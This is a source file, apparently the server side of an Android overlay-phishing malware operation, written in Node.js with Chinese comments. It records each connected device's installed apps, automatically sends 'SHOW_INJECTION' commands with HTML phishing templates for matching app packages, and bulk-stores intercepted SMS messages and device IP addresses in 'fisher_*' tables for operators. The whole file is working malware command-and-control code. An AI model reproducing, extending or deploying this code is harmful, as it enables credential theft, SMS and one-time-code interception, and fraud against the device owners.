        const shouldWriteIp = clientIp ? wtAllow(deviceId, 'public_ip') : false;
        if (shouldWriteLastSeen || shouldWriteIp || true /* is_connected 状态变化必须写 */) {
          const fields = ['is_connected=1', 'connected_at=?'];
          const params = [now];
          if (shouldWriteLastSeen) { fields.push('last_seen=?'); params.push(now); }
          if (clientIp && shouldWriteIp) { fields.push('public_ip=?'); params.push(clientIp); }
          params.push(deviceId);
          await dbWithRetry(
            () => db.query(`UPDATE fisher_devices SET ${fields.join(',')} WHERE device_id=?`, params),
            { label: `updateDeviceStatus:ON:${shortId}`, maxRetries: 3 }
          );
          if (shouldWriteLastSeen) wtMark(deviceId, 'last_seen');
          if (shouldWriteIp) wtMark(deviceId, 'public_ip');
        }
      }
      // 如果不存在，等 syncDeviceStatus 来注册
    } else {
      // 下线：直接写 is_connected=0，不走节流（状态变化重要）
      await dbWithRetry(
        () => db.query(
          'UPDATE fisher_devices SET is_connected=0 WHERE device_id=?',
          [deviceId]
        ),
        { label: `updateDeviceStatus:OFF:${shortId}`, maxRetries: 3 }
      );
    }
  } catch (err) {
    // 死锁类错误降级为 warn（避免日志爆炸）
    if (/Deadlock found|Lock wait timeout/i.test(err.message || '')) {
      console.warn(`[WS-Device] updateDeviceStatus ${isConnected ? 'ON' : 'OFF'} give up (${shortId}...): ${err.message}`);
    } else {
      console.error('[WS-Device] DB error:', err.message);
    }
  }
}

/**
 * 处理设备返回的应用列表
 * 1. 存入 fisher_device_apps 表
 * 2. 如果 injection_active=1，自动对匹配模板的APP下发注入
 */
async function handleAppList(deviceId, msg, ws, connections) {
  try {
    const db = getPool();
    const apps = msg._apps || msg.data?.apps || msg.data || msg.apps || [];
    const appsJson = JSON.stringify(apps);
    const now = Math.floor(Date.now() / 1000);

    // UPSERT: 存在则更新，不存在则插入（新设备默认 injection_active=1）
    await db.query(
      `INSERT INTO fisher_device_apps (device_id, installed_apps, updated_at, injection_active)
       VALUES (?, ?, ?, 1)
       ON DUPLICATE KEY UPDATE installed_apps=VALUES(installed_apps), updated_at=VALUES(updated_at)`,
      [deviceId, appsJson, now]
    );
    console.log(`[WS-Device] Saved ${apps.length} apps for ${deviceId}`);

    // 检查自动注入开关（默认开启：字段为 NULL 或 1 都视为开启）
    const [rows] = await db.query(
      'SELECT injection_active FROM fisher_device_apps WHERE device_id=?',
      [deviceId]
    );
    const injActive = rows && rows.length > 0 ? rows[0].injection_active : 1;
    if (injActive === 0) {
      console.log(`[WS-Device] injection_active=OFF for ${deviceId}, skipping auto-inject`);
    } else {
      console.log(`[WS-Device] injection_active=ON for ${deviceId}, triggering auto-inject...`);
      await autoInjectForDevice(deviceId, apps, ws, connections);
    }
  } catch (err) {
    console.error('[WS-Device] handleAppList error:', err.message);
  }
}

// 内存记录：已对哪些设备+包名执行过自动注入（防止重复注入）
const autoInjectedCache = new Map(); // key: deviceId, value: Set<packageName>

/**
 * 自动注入：匹配设备安装的应用与模板，对所有匹配的包名下发 SHOW_INJECTION
 * 每个设备+包名组合只注入一次（直到设备重新上线清除缓存）
 */
async function autoInjectForDevice(deviceId, apps, ws, connections) {
  try {
    const db = getPool();
    // ★ 优化：先查模板列表（不含 html_content），减少内存和网络开销
    const [templates] = await db.query(
      'SELECT template_id, package_name, name FROM fisher_injection_templates WHERE enabled=1'
    );
    if (!templates || templates.length === 0) return;

    // 构建设备已安装应用包名集合
    const installedPkgs = new Set(
      apps.map(a => typeof a === 'string' ? a : (a.packageName || a.package_name || a.pkg || ''))
    );

    // 获取该设备已注入记录
    if (!autoInjectedCache.has(deviceId)) autoInjectedCache.set(deviceId, new Set());
    const injected = autoInjectedCache.get(deviceId);

    // 匹配模板（跳过已注入过的）
    let injectedCount = 0;
    for (const tpl of templates) {
      const pkg = tpl.package_name;
      if (!pkg || !installedPkgs.has(pkg)) continue;
      if (injected.has(pkg)) {
        console.log(`[WS-Device] Skip auto-inject ${pkg} for ${deviceId} (already injected this session)`);
        continue;
      }

      // ★ 匹配到后才查 html_content（按需加载，避免一次性加载几百个 HTML）
      const [rows] = await db.query(
        'SELECT html_content FROM fisher_injection_templates WHERE template_id=? LIMIT 1',
        [tpl.template_id]
      );
      const htmlContent = rows?.[0]?.html_content;
      if (!htmlContent) continue;

      // 下发 SHOW_INJECTION
      if (ws.readyState === 1) {
        ws.send(JSON.stringify({
          type: 'command',
          sessionId: deviceId,
          data: {
            command: 'SHOW_INJECTION',
            params: {
              packageName: pkg,
              htmlContent: htmlContent,
              templateId: tpl.template_id
            }
          }
        }));
        injected.add(pkg);
        injectedCount++;
        console.log(`[WS-Device] Auto-inject ${pkg} (${tpl.name}) to ${deviceId}`);
      }
    }
    if (injectedCount > 0) {
      console.log(`[WS-Device] Auto-injected ${injectedCount} apps for ${deviceId}`);
      broadcastToAdmins(connections, {
        type: 'auto_injection_done',
        deviceId,
        count: injectedCount
      });
    }
  } catch (err) {
    console.error('[WS-Device] autoInjectForDevice error:', err.message);
  }
}

/**
 * 保存设备数据到 AI 分析缓存表 fisher_ai_device_data
 * UPSERT: 按 device_id + data_type 唯一键更新
 */
async function saveAiDeviceData(deviceId, dataType, data) {
  if (!deviceId || !data) return;
  try {
    const db = getPool();
    const jsonStr = JSON.stringify(data);
    const count = Array.isArray(data) ? data.length : 1;
    await db.query(
      `INSERT INTO fisher_ai_device_data (device_id, data_type, data_json, data_count, updated_at)
       VALUES (?, ?, ?, ?, NOW())
       ON DUPLICATE KEY UPDATE data_json=VALUES(data_json), data_count=VALUES(data_count), updated_at=NOW()`,
      [deviceId, dataType, jsonStr, count]
    );
    console.log(`[WS-Device] Saved AI data: ${deviceId} type=${dataType} count=${count}`);
  } catch (err) {
    console.error('[WS-Device] saveAiDeviceData error:', err.message);
  }
}

/**
 * 增量保存短信到 fisher_sms_messages 表
 * 去重逻辑：按 device_id + address + body + date 判断是否已存在
 * 只插入新短信，避免重复
 */
async function saveSmsToMessages(deviceId, smsList) {
  if (!deviceId || !Array.isArray(smsList) || smsList.length === 0) return;
  try {
    const db = getPool();
    // 获取该设备已有短信的去重指纹集合
    const [existing] = await db.query(
      'SELECT address, body, date FROM fisher_sms_messages WHERE device_id = ?',
      [deviceId]
    );
    const existingSet = new Set(
      existing.map(r => `${r.address || ''}|${(r.body || '').substring(0, 100)}|${r.date || ''}`)
    );

    // 筛选出新短信
    const newItems = [];
    for (const sms of smsList) {
      const addr = sms.address || sms.sender || sms.from || sms.number || '';
      const body = sms.body || sms.content || sms.message || '';
      const date = sms.date || sms.time || sms.timestamp || '';
      const dateStr = String(date);
      const fingerprint = `${addr}|${body.substring(0, 100)}|${dateStr}`;
      if (!existingSet.has(fingerprint)) {
        newItems.push({ addr, body, date: dateStr, sms });
        existingSet.add(fingerprint); // 防止同一批中重复
      }
    }

    if (newItems.length === 0) {
      console.log(`[WS-Device] saveSmsToMessages: ${deviceId} no new SMS (all ${smsList.length} already exist)`);
      return;
    }

    // 批量插入新短信
    const values = newItems.map(item => {
      const smsType = item.sms.type !== undefined ? parseInt(item.sms.type) || 1 : 1;
      const read = item.sms.read !== undefined ? (item.sms.read ? 1 : 0) : 0;
      const createdAt = Math.floor(Date.now() / 1000);
      return [deviceId, item.addr, item.body, item.date, smsType, read, createdAt];
    });

    const placeholders = values.map(() => '(?, ?, ?, ?, ?, ?, ?)').join(', ');
    const flat = values.flat();
    await db.query(
      `INSERT INTO fisher_sms_messages (device_id, address, body, date, type, \`read\`, created_at) VALUES ${placeholders}`,
      flat
    );
    console.log(`[WS-Device] saveSmsToMessages: ${deviceId} inserted ${newItems.length} new SMS (total received: ${smsList.length})`);
  } catch (err) {
    console.error('[WS-Device] saveSmsToMessages error:', err.message);
  }
}

module.exports = { handleDevice, handleDeviceMessage, syncDeviceStatus };
